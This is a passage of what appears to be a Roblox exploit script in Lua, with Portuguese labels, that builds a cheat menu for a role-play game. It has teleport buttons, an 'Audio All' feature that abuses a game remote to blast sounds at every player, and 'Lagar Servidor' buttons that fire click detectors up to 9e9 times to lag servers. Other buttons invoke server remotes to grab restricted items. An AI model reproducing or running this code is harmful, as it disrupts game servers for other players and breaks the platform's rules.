        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar Para O Hospital
local button11 = C:AddButton({
    Name = "Teleportar Para O Hospital",
    Callback = function()
        local x, y, z = -309, 4, 71
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar Para a Agência
local button12 = C:AddButton({
    Name = "Teleportar Para a Agência",
    Callback = function()
        local x, y, z = 179, 4, -464
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar Para Sala Secreta da Oficina
button13 = C:AddButton({
    Name = "Teleportar Para Sala Secreta da Oficina",
    Callback = function()
        local x, y, z = 0, 4, -495
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar Para Sala Secreta 2
button14 = C:AddButton({
    Name = "Teleportar Para Sala Secreta 2",
    Callback = function()
        local x, y, z = -343, 4, -613
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar Para Ilha
button15 = C:AddButton({
    Name = "Teleportar Para Ilha",
    Callback = function()
        local x, y, z = -1925, 23, 127
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar Para Centro Dos Hoteis
button16 = C:AddButton({
    Name = "Teleportar Para Centro Dos Hoteis",
    Callback = function()
        local x, y, z = 182, 4, 150
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar 
button17 = C:AddButton({
    Name = "Teleportar Para Montanha 1",
    Callback = function()
        local x, y, z = -670, 251, 765
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar 
button18 = C:AddButton({
    Name = "Teleportar Para o Banco",
    Callback = function()
        local x, y, z = 2.28, 4.65, 254.58
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar
button19 = C:AddButton({
    Name = "Teleportar Para Loja De Roupas",
    Callback = function()
        local x, y, z = -46.15, 4.65, 253.20
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar 
button20 = C:AddButton({
    Name = "Teleportar Para Shelter",
    Callback = function()
        local x, y, z = -88.48, 22.05, 262.34
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar 
button21 = C:AddButton({
    Name = "Teleportar Para Dentista",
    Callback = function()
        local x, y, z = -53.58, 22.15, 265.61
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar 
button22 = C:AddButton({
    Name = "Teleportar Para Coffe",
    Callback = function()
        local x, y, z = -97.12, 4.65, 254.99
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar 
button23 = C:AddButton({
    Name = "Teleportar Para Biblioteca",
    Callback = function()
        local x, y, z = -132.20, 4.65, 254.07
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar 
button24 = C:AddButton({
    Name = "Teleportar Post Office",
    Callback = function()
        local x, y, z = -168.84, 4.65, 256.55
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar 
button25 = C:AddButton({
    Name = "Teleportar Para Local X",
    Callback = function()
        local x, y, z = -140.46, 4.75, 129.97
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar 
button26 = C:AddButton({
    Name = "Teleportar Para Smart",
    Callback = function()
        local x, y, z = -127.52, 21.25, 251.89
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

local Tab99 = Window:MakeTab({Name = "AUDIO ALL", Icon = "rbxassetid://10734961284"})

local ReplicatedStorage = game:GetService("ReplicatedStorage")

if not _G.audio_all_delay then
  _G.audio_all_delay = 1
end

local function Audio_All_ClientSide(ID)

  local function CheckFolderAudioAll()
    local FolderAudio = workspace:FindFirstChild("Audio all client")
    if FolderAudio then
      return FolderAudio
    else
      local FolderAudio = Instance.new("Folder")
      FolderAudio.Name = "Audio all client"
      FolderAudio.Parent = workspace
      return FolderAudio
    end
  end

  local function CreateSound(ID)

    if type(ID) ~= "number" then
      print("Ensira o número")
      return nil
    end

    local Folder_Audio = CheckFolderAudioAll()
    if Folder_Audio then
      local Sound = Instance.new("Sound")
      Sound.SoundId = "rbxassetid://" .. ID
      Sound.Volume = 1
      Sound.Looped = false
      Sound.Parent = Folder_Audio
      Sound:Play()
      task.wait(3)
      Sound:Destroy()
    end
  end

  CreateSound(ID)

end

local function Audio_All_ServerSide(ID)

  if type(ID) ~= "number" then
    print("Ensira um numero")
    return nil
  end

  local GunSoundEvent = ReplicatedStorage:FindFirstChild("1Gu1nSound1s", true)
  if GunSoundEvent then
    GunSoundEvent:FireServer(workspace, ID, 1)
  end
end

local audio_all_dropdown_value = nil

Tab99:AddSection({"Audio all através de lista de IDS"})

Tab99:AddDropdown({
  Name = "Lista de ids de música",
  Options = {6821054463, 103215672097028, 930613220, 18131809532, 137177653817621, 1601659619, 6250446601, 18925320031, 5710016194, 270145703},
  Default = {},
  MultSelect = false,
  Callback = function(value)
    audio_all_dropdown_value = value
  end
})

Tab99:AddButton({
  Name = "Tocar audio",
  Callback = function()
    Audio_All_ServerSide(audio_all_dropdown_value)
    task.spawn(function()
      Audio_All_ClientSide(audio_all_dropdown_value)
    end)
  end
})

Tab99:AddToggle({
  Name = "Tocar loop",
  Default = false,
  Callback = function(value)

    getgenv().Audio_All_loop = value

    while getgenv().Audio_All_loop do
      Audio_All_ServerSide(audio_all_dropdown_value)
      task.spawn(function()
        Audio_All_ClientSide(audio_all_dropdown_value)
      end)
      task.wait(_G.audio_all_delay)
    end
  end
})

local audio_all_textbox_value = nil

local function CheckNumberInString(str)
  return str:match("^%d+$") ~= nil
end

Tab99:AddSection({"Audio all através de (você que coloca seus próprios ids)"})

Tab99:AddTextBox({
  Name = "Adicionar id",
  Default = "",
  PlaceholderText = "Digite um id válido",
  ClearText = true,
  Callback = function(value)
    audio_all_textbox_value = value
  end
})

Tab99:AddButton({
  Name = "Tocar audio",
  Callback = function()
    
    local string_number = audio_all_textbox_value
    if CheckNumberInString(string_number) then
      Audio_All_ServerSide(tonumber(string_number))
      task.spawn(function()
        Audio_All_ClientSide(tonumber(string_number))
      end)
    else
      print("A string não só tem número")
    end
  end
})

Tab99:AddToggle({
  Name = "Tocar loop",
  Default = false,
  Callback = function(value)

    getgenv().Audio_All_loop2 = value
    local string_number = audio_all_textbox_value
    
    while getgenv().Audio_All_loop2 do
      if CheckNumberInString(string_number) then
        Audio_All_ServerSide(tonumber(string_number))
        task.spawn(function()
          Audio_All_ClientSide(tonumber(string_number))
        end)
      else
        print("A string não só tem número")
      end
      task.wait(_G.audio_all_delay)
    end
  end
})

local Tab9 = Window:MakeTab({Name = "Lag", Icon = "rbxassetid://10734962068"})

Tab9:AddSection({"Lag All"})

local BNumber = 900 -- Valor fixo

Tab9:AddButton({
    Name = "Lagar Servidor Laptop",
    Callback = function()
        local Player = game.Players.LocalPlayer 
        local Character = Player.Character or Player.CharacterAdded:Wait()
        local RootPart = Character:WaitForChild("HumanoidRootPart")
        local Clone = game:GetService("Workspace"):FindFirstChild("WorkspaceCom") 
            and game:GetService("Workspace").WorkspaceCom:FindFirstChild("001_GiveTools")
            and game:GetService("Workspace").WorkspaceCom["001_GiveTools"]:FindFirstChild("Laptop")

        if Clone and Clone:FindFirstChild("ClickDetector") then
            local OldPos = RootPart.CFrame -- Armazena a posição original

            -- Função otimizada para usar RunService
            local function executeTask()
                local iterationsPerFrame = 500  -- Número de interações por vez
                local totalIterations = BNumber
                local processed = 0

                -- Usa RunService para processar as interações sem bloquear o cliente
                game:GetService("RunService").Heartbeat:Connect(function()
                    for i = 1, iterationsPerFrame do
                        if processed < totalIterations then
                            RootPart.CFrame = Clone.CFrame -- Teletransporta para a posição do clone
                            fireclickdetector(Clone.ClickDetector) -- Clica no detector
                            processed = processed + 1
                        else
                            return  -- Se todas as iterações foram feitas, para o loop
                        end
                    end
                end)

            end

            -- Executa a função de forma assíncrona
            task.spawn(executeTask)

            -- Retorna à posição original quase imediatamente
            RootPart.CFrame = OldPos 
        else
            warn("Laptop ou ClickDetector não encontrado!")
        end
    end
})

local BNumber = 9e9 -- Valor fixo

Tab9:AddButton({
    Name = "Lagar Servidor iPhone",
    Callback = function()
        local Player = game.Players.LocalPlayer 
        local Character = Player.Character or Player.CharacterAdded:Wait()
        local RootPart = Character:WaitForChild("HumanoidRootPart")
        local Clone = game:GetService("Workspace"):FindFirstChild("WorkspaceCom") 
            and game:GetService("Workspace").WorkspaceCom:FindFirstChild("001_CommercialStores")
            and game:GetService("Workspace").WorkspaceCom["001_CommercialStores"]:FindFirstChild("CommercialStorage1")
            and game:GetService("Workspace").WorkspaceCom["001_CommercialStores"].CommercialStorage1:FindFirstChild("Store")
            and game:GetService("Workspace").WorkspaceCom["001_CommercialStores"].CommercialStorage1.Store:FindFirstChild("Tools")
            and game:GetService("Workspace").WorkspaceCom["001_CommercialStores"].CommercialStorage1.Store.Tools:FindFirstChild("Iphone")

        if Clone and Clone:FindFirstChild("ClickDetector") then
            local OldPos = RootPart.CFrame -- Armazena a posição original

            -- Função otimizada para usar RunService
            local function executeTask()
                local iterationsPerFrame = 500  -- Número de interações por vez
                local totalIterations = BNumber
                local processed = 0

                -- Usa RunService para processar as interações sem bloquear o cliente
                game:GetService("RunService").Heartbeat:Connect(function()
                    for i = 1, iterationsPerFrame do
                        if processed < totalIterations then
                            RootPart.CFrame = Clone.CFrame -- Teletransporta para a posição do clone
                            fireclickdetector(Clone.ClickDetector) -- Clica no detector
                            processed = processed + 1
                        else
                            return  -- Se todas as iterações foram feitas, para o loop
                        end
                    end
                end)

            end

            -- Executa a função de forma assíncrona
            task.spawn(executeTask)

            -- Retorna à posição original quase imediatamente
            RootPart.CFrame = OldPos 
        else
            warn("Iphone ou ClickDetector não encontrado!")
        end
    end
})

local BNumber = 9e9 -- Valor fixo

Tab9:AddButton({
    Name = "Lagar Servidor Basketball",
    Callback = function()
        local Player = game.Players.LocalPlayer 
        local Character = Player.Character or Player.CharacterAdded:Wait()
        local RootPart = Character:WaitForChild("HumanoidRootPart")
        local Clone = game:GetService("Workspace"):FindFirstChild("WorkspaceCom") 
            and game:GetService("Workspace").WorkspaceCom:FindFirstChild("001_SchoolGym")
            and game:GetService("Workspace").WorkspaceCom["001_SchoolGym"]:FindFirstChild("SchoolGymStorage1")
            and game:GetService("Workspace").WorkspaceCom["001_SchoolGym"].SchoolGymStorage1:FindFirstChild("Store")
            and game:GetService("Workspace").WorkspaceCom["001_SchoolGym"].SchoolGymStorage1.Store:FindFirstChild("Tools")
            and game:GetService("Workspace").WorkspaceCom["001_SchoolGym"].SchoolGymStorage1.Store.Tools:FindFirstChild("Basketball")

        if Clone and Clone:FindFirstChild("ClickDetector") then
            local OldPos = RootPart.CFrame -- Armazena a posição original

            -- Função otimizada para usar RunService
            local function executeTask()
                local iterationsPerFrame = 500  -- Número de interações por vez
                local totalIterations = BNumber
                local processed = 0

                -- Usa RunService para processar as interações sem bloquear o cliente
                game:GetService("RunService").Heartbeat:Connect(function()
                    for i = 1, iterationsPerFrame do
                        if processed < totalIterations then
                            RootPart.CFrame = Clone.CFrame -- Teletransporta para a posição do clone
                            fireclickdetector(Clone.ClickDetector) -- Clica no detector
                            processed = processed + 1
                        else
                            return  -- Se todas as iterações foram feitas, para o loop
                        end
                    end
                end)

            end

            -- Executa a função de forma assíncrona
            task.spawn(executeTask)

            -- Retorna à posição original quase imediatamente
            RootPart.CFrame = OldPos 
        else
            warn("Basketball ou ClickDetector não encontrado!")
        end
    end
})

Tab9:AddSection({"Fire Ex Formatos"})

local BNumber = 600 -- Valor fixo
local distanciaEntreItens = 3 -- Distância entre os itens ao longo do bastão

-- Função para organizar itens em forma de bastão gigante para baixo
local function organizarItensEmBastaoParaBaixo()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local backpack = player.Backpack
    local rootPart = character:WaitForChild("HumanoidRootPart")

    -- Coleta todos os Tools no personagem e na mochila
    local itens = {}

    -- Procura Tools no personagem
    for _, item in pairs(character:GetChildren()) do
        if item:IsA("Tool") and item.Name == "FireX" then
            table.insert(itens, item)
        end
    end

    -- Procura Tools na mochila
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") and item.Name == "FireX" then
            table.insert(itens, item)
        end
    end

    -- Verifica duplicatas e organiza por nome
    local duplicatas = {}
    for _, item in pairs(itens) do
        if not duplicatas[item.Name] then
            duplicatas[item.Name] = {}
        end
        table.insert(duplicatas[item.Name], item)
    end

    -- Para cada grupo de duplicatas, organize-os em formato de bastão
    local yOffset = 0 -- Offset inicial no eixo Y
    for _, grupo in pairs(duplicatas) do
        local total = #grupo
        if total > 1 then
            for i, item in pairs(grupo) do
                -- Equipa o item para ajustar o GripPos
                item.Parent = character

                -- Define a posição vertical para o item no bastão (para baixo no eixo Y)
                item.GripPos = Vector3.new(0, -yOffset, 0)

                -- Incrementa o offset no eixo Y para "descer"
                yOffset = yOffset + distanciaEntreItens

                -- Aguarda um pouco para o efeito ser visível
                task.wait()

                -- Solta o item colocando de volta na mochila
                item.Parent = backpack
            end
        end
    end

    -- Equipa todos os itens "FireX" da mochila
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") and item.Name == "FireX" then
            item.Parent = character
        end
    end
end

-- Script do botão
Tab9:AddButton({
    Name = "Lag Fire Ex Bastão Gigante para Baixo",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Character = Player.Character or Player.CharacterAdded:Wait()
        local RootPart = Character:WaitForChild("HumanoidRootPart")

        -- Atualização da hierarquia para FireX
        local Clone = game:GetService("Workspace"):FindFirstChild("WorkspaceCom")
            and game:GetService("Workspace").WorkspaceCom:FindFirstChild("001_GiveTools")
            and game:GetService("Workspace").WorkspaceCom["001_GiveTools"]:FindFirstChild("FireX")

        if Clone and Clone:FindFirstChild("ClickDetector") then
            local OldPos = RootPart.CFrame -- Armazena a posição original

            -- Loop para pegar os itens repetidamente
            local processed = 0
            while processed < BNumber do
                RootPart.CFrame = Clone.CFrame -- Teletransporta para o clone
                fireclickdetector(Clone.ClickDetector) -- Clica no detector
                processed = processed + 1
                task.wait() -- Pausa para evitar travamento
            end

            -- Retorna à posição original
            RootPart.CFrame = OldPos

            -- Executa a função de organização ao final do loop
            organizarItensEmBastaoParaBaixo()
        else
            warn("FireX ou ClickDetector não encontrado!")
        end
    end
})

local BNumber = 600 -- Valor fixo
local raioCirculo = 5 -- Distância do círculo em relação ao personagem

-- Função para organizar itens em formato de círculo
local function organizarItensEmCirculo()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Coleta todos os Tools no personagem e na mochila  
local itens = {}  
  
-- Procura Tools no personagem  
for _, item in pairs(character:GetChildren()) do  
    if item:IsA("Tool") and item.Name == "FireX" then  
        table.insert(itens, item)  
    end  
end  
  
-- Procura Tools na mochila  
for _, item in pairs(backpack:GetChildren()) do  
    if item:IsA("Tool") and item.Name == "FireX" then  
        table.insert(itens, item)  
    end  
end  
  
-- Verifica duplicatas e organiza por nome  
local duplicatas = {}  
for _, item in pairs(itens) do  
    if not duplicatas[item.Name] then  
        duplicatas[item.Name] = {}  
    end  
    table.insert(duplicatas[item.Name], item)  
end  
  
-- Para cada grupo de duplicatas, organize-os em formato de círculo  
for _, grupo in pairs(duplicatas) do  
    local total = #grupo  
    if total > 1 then  
        for i, item in pairs(grupo) do  
            -- Equipa o item para ajustar o GripPos  
            item.Parent = character  
              
            -- Calcula o ângulo de cada item no círculo  
            local angulo = (i / total) * (2 * math.pi)  
              
            -- Calcula a posição circular atrás do jogador  
            local offsetX = math.cos(angulo) * raioCirculo  
            local offsetZ = math.sin(angulo) * raioCirculo  
              
            -- Define a posição atrás do HumanoidRootPart  
            item.GripPos = Vector3.new(-offsetX, 0, -offsetZ - raioCirculo)  
              
            -- Aguarda um pouco para o efeito ser visível  
            task.wait()  
              
            -- Solta o item colocando de volta na mochila  
            item.Parent = backpack  
        end  
    end  
end  
  
-- Equipa todos os itens "FireX" da mochila  
for _, item in pairs(backpack:GetChildren()) do  
    if item:IsA("Tool") and item.Name == "FireX" then  
        item.Parent = character  
    end  
end

end

-- Script do botão
Tab9:AddButton({
Name = "Lag Fire Ex Símbolo Circular",
Callback = function()
local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local RootPart = Character:WaitForChild("HumanoidRootPart")

-- Atualização da hierarquia para FireX  
    local Clone = game:GetService("Workspace"):FindFirstChild("WorkspaceCom")   
        and game:GetService("Workspace").WorkspaceCom:FindFirstChild("001_GiveTools")  
        and game:GetService("Workspace").WorkspaceCom["001_GiveTools"]:FindFirstChild("FireX")  

    if Clone and Clone:FindFirstChild("ClickDetector") then  
        local OldPos = RootPart.CFrame -- Armazena a posição original  

        -- Loop para pegar os itens repetidamente  
        local processed = 0  
        while processed < BNumber do  
            RootPart.CFrame = Clone.CFrame -- Teletransporta para o clone  
            fireclickdetector(Clone.ClickDetector) -- Clica no detector  
            processed = processed + 1  
            task.wait() -- Pausa para evitar travamento  
        end  

        -- Retorna à posição original  
        RootPart.CFrame = OldPos   

        -- Executa a função de organização ao final do loop  
        organizarItensEmCirculo()  
    else  
        warn("FireX ou ClickDetector não encontrado!")  
    end  
end

})

local BNumber = 600 -- Valor fixo
local distanciaAtras = 5 -- Distância da parede em relação ao personagem
local espacamentoX = 3 -- Espaçamento horizontal entre itens
local espacamentoY = 3 -- Espaçamento vertical entre itens

-- Função para organizar itens em formato de parede
local function organizarItensEmParede()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local backpack = player.Backpack
    local rootPart = character:WaitForChild("HumanoidRootPart")

    -- Coleta todos os Tools no personagem e na mochila
    local itens = {}
    
    -- Procura Tools no personagem
    for _, item in pairs(character:GetChildren()) do
        if item:IsA("Tool") and item.Name == "FireX" then
            table.insert(itens, item)
        end
    end
    
    -- Procura Tools na mochila
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") and item.Name == "FireX" then
            table.insert(itens, item)
        end
    end
    
    -- Verifica duplicatas e organiza por nome
    local duplicatas = {}
    for _, item in pairs(itens) do
        if not duplicatas[item.Name] then
            duplicatas[item.Name] = {}
        end
        table.insert(duplicatas[item.Name], item)
    end
    
    -- Organiza os itens em formato de parede
    for _, grupo in pairs(duplicatas) do
        local total = #grupo
        
        -- Calcula o número de colunas e linhas necessárias
        local colunas = math.ceil(math.sqrt(total))
        local linhas = math.ceil(total / colunas)
        
        for i, item in pairs(grupo) do
            -- Calcula a posição na grade
            local linha = math.floor((i-1) / colunas)
            local coluna = (i-1) % colunas
            
            -- Equipa o item para ajustar o GripPos
            item.Parent = character
            
            -- Ajusta a posição na parede atrás do jogador
            item.GripPos = Vector3.new(coluna * espacamentoX, -linha * espacamentoY, -distanciaAtras)
            
            -- Aguarda um pouco para o efeito ser visível
            task.wait()
            
            -- Solta o item colocando de volta na mochila
            item.Parent = backpack
        end
    end
    
    -- Equipa todos os itens "FireX" da mochila
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") and item.Name == "FireX" then
            item.Parent = character
        end
    end
end

-- Script do botão
Tab9:AddButton({
    Name = "Lag Fire Ex Wall",
    Callback = function()
        local Player = game.Players.LocalPlayer 
        local Character = Player.Character or Player.CharacterAdded:Wait()
        local RootPart = Character:WaitForChild("HumanoidRootPart")
        
        -- Atualização da hierarquia para FireX
        local Clone = game:GetService("Workspace"):FindFirstChild("WorkspaceCom") 
            and game:GetService("Workspace").WorkspaceCom:FindFirstChild("001_GiveTools")
            and game:GetService("Workspace").WorkspaceCom["001_GiveTools"]:FindFirstChild("FireX")

        if Clone and Clone:FindFirstChild("ClickDetector") then
            local OldPos = RootPart.CFrame -- Armazena a posição original

            -- Loop para pegar os itens repetidamente
            local processed = 0
            while processed < BNumber do
                RootPart.CFrame = Clone.CFrame -- Teletransporta para o clone
                fireclickdetector(Clone.ClickDetector) -- Clica no detector
                processed = processed + 1
                task.wait() -- Pausa para evitar travamento
            end

            -- Retorna à posição original
            RootPart.CFrame = OldPos 

            -- Executa a função de organização ao final do loop
            organizarItensEmParede()
        else
            warn("FireX ou ClickDetector não encontrado!")
        end
    end
})

Tab3 = Window:MakeTab({Name = "Items", Icon = "rbxassetid://10709769841"})

local Paragraph = Tab3:AddParagraph({"Items", "Itens Interessantes"})

Button = Tab3:AddButton({
  Name = "Cartão de Energia",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "PowerKeyCard"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

Button = Tab3:AddButton({
  Name = "Cristal 1",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "Crystal"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

Button = Tab3:AddButton({
  Name = "Cristal 2",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "Crystals"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

Button = Tab3:AddButton({
  Name = "Chave Antiga",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "OldKey"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

Button = Tab3:AddButton({
  Name = "Espada de Ouro",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "SwordGold"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

Button = Tab3:AddButton({
  Name = "Cartão da Agência Secreta",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "KeyCardDarkGreen"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

Button = Tab3:AddButton({
  Name = "Mangueira de Incêndio",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "FireHose"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

Button = Tab3:AddButton({
  Name = "Livro da Agência Secreta",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "AgencyBook"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

Button = Tab3:AddButton({
  Name = "Cartão de Banco Branco",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "KeyCardWhite"
    }
    
    local remoteFunction = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
    if remoteFunction then
      remoteFunction:InvokeServer(unpack(args))
    end
  end
})

Button = Tab3:AddButton({
  Name = "Sofá de Luxo",
  Callback = function()
    local args = {
      [1] = "PickingTools",
      [2] = "Couch"
    }
    
